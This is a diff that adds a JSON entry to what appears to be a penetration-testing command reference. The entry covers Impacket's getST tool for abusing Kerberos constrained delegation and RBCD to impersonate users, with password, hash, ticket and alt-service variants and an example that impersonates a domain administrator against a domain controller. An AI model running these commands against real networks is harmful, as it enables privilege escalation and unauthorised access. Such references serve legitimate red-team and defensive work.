@@ -1,0 +1,41 @@
+{
+  "id": "getST-s4u",
+  "name": "Impacket getST (S4U)",
+  "command": "impacket-getST -spn '<service>/<target_host>' -impersonate '<target_user>' '<domain>/<user>:<password>' -dc-ip <ip>",
+  "description": "Abuse constrained delegation or RBCD via S4U2Self/S4U2Proxy to impersonate a user",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "kerberos"
+  ],
+  "tags": [
+    "impacket",
+    "s4u",
+    "delegation",
+    "constrained",
+    "rbcd",
+    "impersonation"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-getST -spn '<service>/<target_host>' -impersonate '<target_user>' -hashes ':<hash>' '<domain>/<user>' -dc-ip <ip>"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "impacket-getST -spn '<service>/<target_host>' -impersonate '<target_user>' -k -no-pass '<domain>/<user>' -dc-ip <ip>"
+    },
+    {
+      "label": "Alt-Service Swap",
+      "requires": "hash",
+      "command": "impacket-getST -spn '<service>/<target_host>' -impersonate '<target_user>' -hashes ':<hash>' '<domain>/<user>' -dc-ip <ip> -altservice '<alt_service>'"
+    }
+  ],
+  "examples": [
+    "impacket-getST -spn 'cifs/dc01.corp.local' -impersonate 'administrator' 'corp.local/svc_account:password' -dc-ip 192.168.1.100"
+  ]
+}
